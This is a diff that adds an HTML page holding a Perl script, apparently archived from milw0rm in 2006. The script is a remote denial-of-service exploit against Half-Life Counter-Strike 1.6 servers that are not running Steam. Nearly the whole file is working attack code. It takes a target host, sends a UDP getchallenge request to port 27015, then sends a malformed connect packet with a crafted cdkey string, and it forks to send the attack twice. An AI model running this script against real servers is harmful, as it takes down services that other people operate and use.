@@ -1,0 +1,40 @@
+<html><head><title>Half-Life CSTRIKE Server <= 1.6 (non steam) Denial of Service Exploit </title></head><pre>#!/usr/bin/perl
+# Server must not be running steam. /str0ke
+
+
+# Half-Life engine remote DoS exploit
+# bug found by Firestorm
+# tested against cstrike 1.6 Windows build-in server, cstrike 1.6 linux dedicated server
+use IO::Socket;
+die &quot;usage: ./csdos &lt;host&gt;&quot; unless $ARGV[0];
+$host=$ARGV[0];
+
+if (fork())
+{       econnect($host); }
+else
+{ econnect($host); };
+exit;
+
+sub econnect($)
+{
+        my $host=$_[0];
+        my $sock = new
+IO::Socket::INET(PeerAddr=&gt;$host,PeerPort=&gt;'27015',Proto=&gt;'udp');
+        die &quot;Could not create socket: $!\n&quot; unless $sock;
+        $cmd=&quot;\xff\xff\xff\xff&quot;;
+        syswrite $sock, $cmd.&quot;getchallenge&quot;;
+
+        sysread $sock,$b,65535;  print $b,&quot;\n&quot;;
+        @c=split(/ /,$b);
+
+        $c2=$c[1];
+
+        $q=$cmd.&quot;connect 47 $c2 \&quot;\\prot\\4\\unique\\0\\raw\\valve\\cdkey\\f0ef8a36258af1bb64ed866538c9db76\&quot;\&quot;\\\&quot;\0\0&quot;;
+print '&gt;',$q,&quot;\n&quot;;
+syswrite $sock, $q;
+sysread $sock,$b,65535; print $b,&quot;\n&quot;;
+sleep 3;
+close $sock;
+}
+
+# milw0rm.com [2006-02-11]</pre></html>
